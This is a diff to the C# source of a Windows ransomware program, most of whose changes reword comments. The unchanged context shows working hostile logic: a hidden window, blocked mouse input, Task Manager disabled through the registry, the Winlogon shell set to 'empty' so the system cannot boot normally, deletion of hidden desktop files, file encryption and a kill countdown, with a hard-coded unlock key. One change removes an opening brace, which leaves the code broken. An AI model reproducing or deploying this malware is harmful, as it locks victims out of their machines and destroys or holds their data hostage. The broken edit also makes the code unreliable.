@@ -12,6 +12,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Windows.Forms;
 
+//Added comments within the code for whoever needs to comprehend what happens where and why
 namespace Rasomware2._0
 {
     public partial class Ransomware2 : Form
@@ -22,7 +23,7 @@ namespace Rasomware2._0
         [DllImport("User32")]
         private static extern int ShowWindow(int hwnd, int nCmdShow);
 
-        //for BlockMouse
+        //To block Mouse movement
         [DllImport("user32.dll")]
         private static extern bool BlockInput(bool block);
 
@@ -40,9 +41,9 @@ namespace Rasomware2._0
         private void Ransomware2_Load(object sender, EventArgs e)
         {
             this.Opacity = 0.0;                
-            this.Size = new Size(50, 50);      //Invisible
+            this.Size = new Size(50, 50);//Invisible
             Location = new Point(-100, -100);
-            FreezeMouse(); //Freeze mouse
+            FreezeMouse(); //Freeze mouse activity. Mouse will not work at this instance
 
             //Disable taskmanager
             RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"); 
@@ -50,12 +51,12 @@ namespace Rasomware2._0
             //Remove wallpaper
             RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
             reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
-            //If you shutdown your computer, you cant run winodws well
+            //If you shutdown your computer, you cant run windows well. So do not shut down. PC will definitely crash
             RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
             reg3.SetValue("Shell", "empty", RegistryValueKind.String);
 
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define for desktop path
-            //Delete all hidden files on desktop because we cant encrypt hidden files :-(
+            //Delete all hidden files on desktop because this script can't encrypt hidden files :-(
             string[] filesPaths = Directory.EnumerateFiles(path + @"\").
                 Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                 ToArray();
@@ -76,7 +77,7 @@ namespace Rasomware2._0
             timer.Enabled = true;
             //Payloads
             tmr_hide.Start(); //show window again
-            tmr_show.Start(); //delete desktop.ini because we cant encrypt desktop.ini files
+            tmr_show.Start(); //delete desktop.ini because we can't encrypt desktop.ini files
             tmr_if.Start(); //Block cmd, register...
             tmr_encrypt.Start(); //Start locking files
             tmr_clock.Start(); //If you see on window 00:00:00, system will kill
@@ -162,13 +163,12 @@ namespace Rasomware2._0
 
         private void button1_Click(object sender, EventArgs e)
         {
-            if (codebox.Text == "") //If you dont write
+            if (codebox.Text == "") //If you dont write the key
             {
                 MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
 
-            else if(codebox.Text == "password123") //If you write correct key
-            {
+            else if(codebox.Text == "password123") //If you input the correct decryption key
 
                 MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 //Enable taskmanager
@@ -178,9 +178,9 @@ namespace Rasomware2._0
                 RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                 reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
 
-                OFF_Encrypt(); //decrypt all encrypt files
+                OFF_Encrypt(); //decrypt all encrypted files
 
-                //kill ransomware
+                //kill the ransomware
                 Process[] _process = null;
                 _process = Process.GetProcessesByName("Rasomware2.0");
                 foreach (Process proces in _process)
@@ -200,7 +200,7 @@ namespace Rasomware2._0
             BlockInput(true);
         }
 
-        public static void Thawouse() //unfreeze
+        public static void Thawouse() //unfreeze mouse
         {
             BlockInput(false);
         }
